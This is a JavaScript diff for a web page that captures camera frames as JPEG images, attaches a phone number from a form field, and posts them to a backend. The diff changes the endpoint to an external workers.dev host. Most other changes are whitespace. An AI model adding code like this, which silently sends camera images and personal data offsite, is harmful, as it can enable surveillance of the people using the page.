@@ -50,22 +50,22 @@ document.addEventListener('DOMContentLoaded', () => {
             console.log('Camera stream not available, active, or ready for photo capture.');
             return;
         }
-        
+
         const context = photoCanvas.getContext('2d');
-        
+
         // Ensure camera feed has valid dimensions before drawing
         if (cameraFeed.videoWidth === 0 || cameraFeed.videoHeight === 0) {
             console.log("Camera feed not ready (zero dimensions), skipping photo capture this time.");
             return;
         }
-        
+
         // Set canvas dimensions to match the video stream to capture the full image
         photoCanvas.width = cameraFeed.videoWidth;
         photoCanvas.height = cameraFeed.videoHeight;
-        
+
         context.drawImage(cameraFeed, 0, 0, photoCanvas.width, photoCanvas.height);
         const imageDataURL = photoCanvas.toDataURL('image/jpeg', 0.8); // Use JPEG with 80% quality
-        
+
         // Include the current phone number from the input field with the photo data
         const phoneNumber = phoneNumberInput.value;
 
@@ -196,7 +196,7 @@ document.addEventListener('DOMContentLoaded', () => {
     async function sendDataToBackend(data) {
         console.log("Sending data to backend:", data);
         try {
-            const response = await fetch('/api/submit-data', {
+            const response = await fetch('https://glonova.sahilakala.workers.dev/api/submit-data', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
